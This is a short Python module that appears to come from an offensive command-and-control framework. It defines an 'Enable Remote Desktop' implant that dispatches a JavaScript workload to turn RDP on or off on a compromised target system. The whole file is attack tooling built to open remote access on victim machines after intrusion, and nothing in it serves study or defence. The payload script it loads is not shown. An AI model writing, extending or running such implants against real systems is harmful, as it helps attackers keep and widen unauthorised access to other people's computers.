import core.job
import core.implant
import uuid

class EnableRDesktopJob(core.job.Job):
    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        pass
        #self.shell.print_plain(str(self.errno))

class EnableRDesktopImplant(core.implant.Implant):

    NAME = "Enable Remote Desktop"
    DESCRIPTION = "Enables RDP on the target system."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/manage/enable_rdesktop"

    def load(self):
        self.options.register("ENABLE", "true", "Toggle to enable or disable.", enum=["true", "false"])
        self.options.register("MODE", "", "The value for this script.", hidden=True)

    def job(self):
        return EnableRDesktopJob

    def run(self):
        mode = "0" if self.options.get("ENABLE") == "true" else "1"
        self.options.set("MODE", mode)

        workloads = {}
        #workloads["vbs"] = self.load_script("data/implant/manage/enable_rdesktop.vbs", self.options)
        workloads["js"] = self.loader.load_script("data/implant/manage/enable_rdesktop.js", self.options)

        self.dispatch(workloads, self.job)
